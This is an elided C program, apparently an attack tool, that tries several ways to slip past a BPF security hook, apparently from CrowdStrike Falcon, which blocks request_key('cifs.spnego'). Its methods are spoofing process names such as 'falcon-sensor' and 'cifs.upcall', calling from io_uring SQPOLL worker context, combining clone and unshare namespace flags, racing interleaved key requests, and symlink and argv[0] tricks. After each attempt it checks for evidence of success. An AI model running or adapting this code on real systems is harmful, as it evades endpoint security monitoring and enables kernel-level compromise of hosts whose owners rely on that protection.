...
/* io_uring definitions (avoid depending on kernel headers) */
...
struct io_uring_sqe {
        ...
        uint64_t off, addr;
        uint32_t len;
        union { uint32_t rw_flags; uint32_t poll32_events; };
        uint64_t user_data;
...
int main(int argc, char **argv)
{
        ...
        /* === PHASE A: Process name spoofing ===
         * CS BPF might whitelist certain process names.
         * Try request_key(cifs.spnego) with different comm names. */
        fprintf(stderr, "\n[A] cifs.spnego with process name spoofing\n");
        {
                const char *names[] = {
                        "cifs.upcall", "request-key", "mount.cifs",
                        "cifs.idmap", "falcon-sensor", "systemd",
                        "kworker/0:0", "cifsd", "csagent",
                        NULL
                };
                for (int i = 0; names[i]; i++) {
                        ...
                        if (p == 0) {
                                ...
                                /* Also try writing /proc/self/comm */
                                int cfd = open("/proc/self/comm", O_WRONLY);
                                if (cfd >= 0) {
                                        write(cfd, names[i], strlen(names[i]));
                                        close(cfd);
                                }
                                errno = 0;
                                ...
                                fprintf(stderr, "    [%s] rc=%ld errno=%d (%s)\n",
                                        names[i], r, errno, strerror(errno));
                                _exit(r >= 0 ? 0 : 1);
                        }
        ...
        /* === PHASE B: io_uring setup + request from io_uring context ===
         * On kernel 5.14, io_uring workers may bypass BPF LSM hooks.
         * We set up io_uring SQPOLL and try request_key from that context. */
        fprintf(stderr, "\n[B] io_uring SQPOLL context\n");
        {
                struct io_uring_params params;
                memset(&params, 0, sizeof(params));
                params.flags = IORING_SETUP_SQPOLL;
                params.sq_thread_idle = 10000; /* 10s idle */

                int ring_fd = syscall(NR_io_uring_setup, 4, &params);
                fprintf(stderr, "    io_uring_setup rc=%d errno=%d (%s)\n",
                        ring_fd, errno, strerror(errno));
                ...
                if (ring_fd >= 0) {
                        ...
                        /* Map SQEs */
                        size_t sqe_sz = params.sq_entries *
                                        sizeof(struct io_uring_sqe);
                        struct io_uring_sqe *sqes = mmap(0, sqe_sz,
                                PROT_READ | PROT_WRITE,
                                MAP_SHARED | MAP_POPULATE,
                                ring_fd, IORING_OFF_SQES);

                        if (sq_ptr != MAP_FAILED && sqes != MAP_FAILED) {
                                /* Submit a NOP to wake up sqpoll thread */
                                unsigned *sq_tail = (void*)((char*)sq_ptr + params.sq_off.tail);
                                unsigned *sq_array = (void*)((char*)sq_ptr + params.sq_off.array);
                                unsigned tail = *sq_tail;
                                sq_array[tail & (params.sq_entries - 1)] = 0;
                                memset(&sqes[0], 0, sizeof(sqes[0]));
                                sqes[0].opcode = IORING_OP_NOP;
                                __sync_synchronize();
                                *sq_tail = tail + 1;
                                __sync_synchronize();
                                /* Give sqpoll thread time to start */
                                usleep(100000);

                                /* Now try request_key — the sqpoll thread is running,
                                 * our process might inherit some of its context */
                                errno = 0;
                                ret = syscall(NR_request_key, "cifs.spnego", desc, "",
                                              KEY_SPEC_SESSION_KEYRING);
                                fprintf(stderr, "    [with sqpoll] rc=%ld errno=%d (%s)\n",
                                        ret, errno, strerror(errno));
                                if (ret >= 0) { sleep(2); if (check_evidence()) return 0; }
                ...
                /* Also try without SQPOLL */
                memset(&params, 0, sizeof(params));
                ring_fd = syscall(NR_io_uring_setup, 4, &params);
                if (ring_fd >= 0) {
                        errno = 0;
                        ret = syscall(NR_request_key, "cifs.spnego", desc, "",
                                      KEY_SPEC_SESSION_KEYRING);
                        fprintf(stderr, "    [with ring] rc=%ld errno=%d (%s)\n",
                                ret, errno, strerror(errno));
                        if (ret >= 0) { sleep(2); if (check_evidence()) return 0; }
                        close(ring_fd);
                }
        ...
        /* === PHASE C: Clone with different flags ===
         * CLONE_IO, CLONE_FS etc may affect BPF context checks */
        fprintf(stderr, "\n[C] clone() with different flags\n");
        {
                struct {
                        int flags;
                        const char *name;
                        ...
                        {CLONE_NEWUSER | CLONE_NEWPID, "USER+PID"},
                        {0, "plain fork"},
                };
                ...
                for (int i = 0; i < nc; i++) {
                        int pfd[2]; pipe(pfd);
                        pid_t p;
                        if (combos[i].flags & (CLONE_FS | CLONE_FILES)) {
                                /* For CLONE_FS/FILES, use fork+unshare */
                                p = fork();
                                if (p == 0) {
                                        close(pfd[0]);
                                        /* no extra unshare for these */
                                        prctl(PR_SET_NAME, "cifs.upcall", 0, 0, 0);
                                        errno = 0;
                                        long r = syscall(NR_request_key, "cifs.spnego",
                                                         desc, "", KEY_SPEC_SESSION_KEYRING);
                                        dprintf(pfd[1], "%ld %d", r, errno);
                                        close(pfd[1]);
                                        _exit(0);
                                }
                        } else {
                                ...
                                if (p == 0) {
                                        close(pfd[0]);
                                        if (combos[i].flags) {
                                                int rc = unshare(combos[i].flags);
                                                if (rc != 0) {
                                                        dprintf(pfd[1], "-1 %d", errno);
                                                        close(pfd[1]);
                                                        _exit(1);
                                                }
                                        }
                        ...
                        close(pfd[0]);
                        int st; waitpid(p, &st, 0);
                        long rc2 = -1; int err2 = 0;
                        sscanf(buf, "%ld %d", &rc2, &err2);
                        fprintf(stderr, "    [%s] rc=%ld errno=%d (%s)\n",
                                combos[i].name, rc2, err2, strerror(err2));
                        if (rc2 >= 0) { sleep(2); if (check_evidence()) return 0; }
                }
        }

        /* === PHASE D: Rapid interleaved — alternate key types fast ===
         * Idea: maybe BPF caches last decision, rapid switch confuses it */
        fprintf(stderr, "\n[D] Rapid interleaved key types\n");
        {
                int ok = 0;
                for (int i = 0; i < 500; i++) {
                        /* Request allowed type first */
                        syscall(NR_request_key, "user",
                                "debug:test", "x", KEY_SPEC_SESSION_KEYRING);
                        /* Immediately try cifs.spnego */
                        errno = 0;
                        ret = syscall(NR_request_key, "cifs.spnego", desc, "",
                                      KEY_SPEC_SESSION_KEYRING);
                        if (ret >= 0) { ok = 1; break; }
                ...
                if (ok) { sleep(2); if (check_evidence()) return 0; }
        }

        /* === PHASE E: Try with modified exe link / argv[0] === */
        fprintf(stderr, "\n[E] argv[0] spoofing + symlink tricks\n");
        {
                /* Create symlink to ourselves named cifs.upcall */
                char self[256];
                ssize_t len = readlink("/proc/self/exe", self, sizeof(self)-1);
                if (len > 0) {
                        self[len] = 0;
                        char lnk[256];
                        snprintf(lnk, sizeof(lnk), "/tmp/cifs.upcall_%d", getpid());
                        symlink(self, lnk);
                        /* Re-exec ourselves as "cifs.upcall" with special arg */
                        pid_t p = fork();
                        if (p == 0) {
                                prctl(PR_SET_NAME, "cifs.upcall", 0, 0, 0);
                                errno = 0;
                                long r = syscall(NR_request_key, "cifs.spnego",
                                                 desc, "", KEY_SPEC_SESSION_KEYRING);
                                fprintf(stderr, "    [symlink exec] rc=%ld errno=%d (%s)\n",
        ...
        /* === PHASE F: cifs.idmap fallback === */
        fprintf(stderr, "\n[F] request_key(cifs.idmap)\n");
        errno = 0;
